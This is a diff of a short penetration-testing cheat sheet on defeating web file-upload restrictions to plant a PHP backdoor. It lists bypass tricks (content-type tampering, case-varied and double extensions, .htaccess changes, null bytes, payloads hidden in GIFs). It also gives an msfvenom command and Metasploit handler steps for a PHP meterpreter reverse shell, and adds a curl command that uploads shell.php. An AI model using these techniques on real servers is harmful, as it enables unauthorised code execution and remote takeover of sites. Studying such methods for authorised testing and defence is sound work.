@@ -1,11 +1,11 @@
 File_Upload:
-* backdoor
-* intercept & change content type
-* upload file extension with case sensitive + .httaccess
+* backdoor (refer script)
+* intercept & change content type(refer below)
+* upload file extension with case sensitive + modified .httaccess file
 * if php based apps - try upload extension php3,php4-5
 * double extension
 * gifsicle to change content of the GIF to upload backdoor
-* null-byte A41
+* null-byte (A41)
 
 meterpreter:
 1.msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> -f raw > meterpreter.php
@@ -15,3 +15,13 @@ meterpreter:
 	set PAYLOAD php/meterpreter/reverse_tcp
 	set LHOST <IP>
 	run
+
+******
+* if ".php" not works try ".php%" or ".php.;" instead
+* file upload using curl:
+curl -F "Filedata=@./shell.php" http://examole.com/php/upload.php
+* Modify the Content-Type
+	Before: ​shell.php.jpg
+	Before: ​image/jpeg
+	After: ​shell.php
+	After: ​application/x-httpd-php
